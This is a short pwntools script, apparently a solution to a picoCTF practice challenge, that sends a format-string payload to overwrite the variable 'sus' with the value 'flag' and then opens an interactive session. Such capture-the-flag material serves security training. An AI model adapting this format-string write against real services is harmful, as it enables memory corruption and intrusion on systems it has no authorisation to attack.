#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
host, port = 'rhea.picoctf.net', 55259 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    payload = fmtstr_payload(14, {elf.sym['sus'] : 0x67616c66})

    io.sendlineafter(b'?\n', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()